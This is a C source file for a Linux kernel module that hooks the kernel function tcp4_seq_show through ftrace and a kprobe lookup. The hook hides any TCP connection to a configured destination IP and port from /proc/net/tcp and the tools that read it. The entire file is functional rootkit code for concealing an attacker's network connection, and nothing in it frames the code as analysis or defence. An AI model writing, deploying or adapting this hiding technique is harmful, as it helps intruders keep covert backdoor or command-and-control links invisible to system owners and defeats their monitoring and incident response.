#include "hide_tcp_sock.h"

static void *tcp4_seq_show_address;
static int port_hidden = 0;

static void *tcp4_seq_show_addr(void) {
  struct kprobe kp = {.symbol_name = "tcp4_seq_show"};
  void *addr;

  register_kprobe(&kp);
  addr = (void *)kp.addr;
  unregister_kprobe(&kp);

  if (!addr) {
    printk(KERN_ERR "Failed to get tcp4_seq_show address\n");
    return NULL;
  }

  return addr;
}

static asmlinkage long tcp4_seq_show_hook(struct seq_file *seq, void *v) {
  if (v && v != SEQ_START_TOKEN) {
    struct inet_sock *inet = (struct inet_sock *)v;

    if (inet && inet->inet_dport == htons(DEST_PORT) &&
        inet->inet_daddr == htonl(DEST_IP_NUM)) {
      return 0; // Hide the socket
    }
  }

  return ((long (*)(struct seq_file *, void *))tcp4_seq_show_address)(seq, v);
}

static void notrace callback_tcp4_seq_show_hook(unsigned long ip,
                                                unsigned long parent_ip,
                                                struct ftrace_ops *ops,
                                                struct ftrace_regs *regs) {
  if (!within_module(parent_ip, THIS_MODULE))
    regs->regs.ip = (unsigned long)tcp4_seq_show_hook;
}

static struct ftrace_ops port_hide_ftrace_hook = {
    .func = callback_tcp4_seq_show_hook,
    .flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION |
             FTRACE_OPS_FL_IPMODIFY,
};

int register_tcp_sock_hook(void) {
  int ret = 0;

  if (port_hidden)
    return 0;

  if (!tcp4_seq_show_address) {
    tcp4_seq_show_address = tcp4_seq_show_addr();
    if (!tcp4_seq_show_address) {
      printk(KERN_ERR "Failed to get tcp4_seq_show address\n");
      return -1;
    }
  }

  // Now set the filter to enable tracing
  ret = ftrace_set_filter_ip(&port_hide_ftrace_hook,
                             (unsigned long)tcp4_seq_show_address, 0, 0);
  if (ret) {
    printk(KERN_ERR "Failed to set filter for tcp4_seq_show, ret: %d\n", ret);
    return ret;
  }

  // Register the ftrace function first
  ret = register_ftrace_function(&port_hide_ftrace_hook);
  if (ret) {
    printk(KERN_ERR "Failed to register ftrace function\n");
    ftrace_set_filter_ip(&port_hide_ftrace_hook,
                         (unsigned long)tcp4_seq_show_address, 1, 0);
    return ret;
  }

  port_hidden = 1;
  return 0;
}

void unregister_tcp_sock_hook(void) {
  if (!tcp4_seq_show_address || !port_hidden)
    return;

  // Unregister the ftrace hook to stop tracing
  unregister_ftrace_function(&port_hide_ftrace_hook);

  // Disable the filter to stop monitoring the function
  ftrace_set_filter_ip(&port_hide_ftrace_hook,
                       (unsigned long)tcp4_seq_show_address, 1, 0);
  port_hidden = 0;
}
